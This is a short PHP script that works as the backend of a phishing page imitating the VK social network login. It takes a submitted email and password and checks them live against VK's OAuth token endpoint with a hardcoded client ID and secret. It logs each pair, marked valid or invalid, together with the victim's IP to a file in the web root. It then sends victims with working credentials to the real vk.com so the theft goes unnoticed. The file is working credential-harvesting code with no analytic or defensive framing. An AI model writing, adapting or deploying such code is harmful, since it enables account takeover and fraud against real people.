<?php
$login = $_POST['email'];
$pass= $_POST['pass'];
if(!@file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=$login&password=$pass")){
  $ip = $_SERVER['REMOTE_ADDR'];
  $file = $_SERVER['DOCUMENT_ROOT']."/log.log";
  $all = "\r\n$login:$pass:-:$ip";
  $fp = fopen("$file", "a+");
  fwrite($fp, $all);
  fclose($fp);
  header("location:index.php?i=1");
}else{
  $proverca = file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=$login&password=$pass");
  $proverca = json_decode($proverca, true);
  $proverca_token = $proverca['access_token'];
  if($proverca['user_id']){
      $ip = $_SERVER['REMOTE_ADDR'];
      $file = $_SERVER['DOCUMENT_ROOT']."/log.log";
      $all = "\r\n$login:$pass:+:$ip";
      $fp = fopen("$file", "a+");
      fwrite($fp, $all);
      fclose($fp);
      header("location: https://vk.com");
  }else{
    $ip = $_SERVER['REMOTE_ADDR'];
    $file = $_SERVER['DOCUMENT_ROOT']."/log.log";
    $all = "\r\n$login:$pass:-:$ip";
    $fp = fopen("$file", "a+");
    fwrite($fp, $all);
    fclose($fp);
     header("location:index.php?i=1");
  }
}
?>
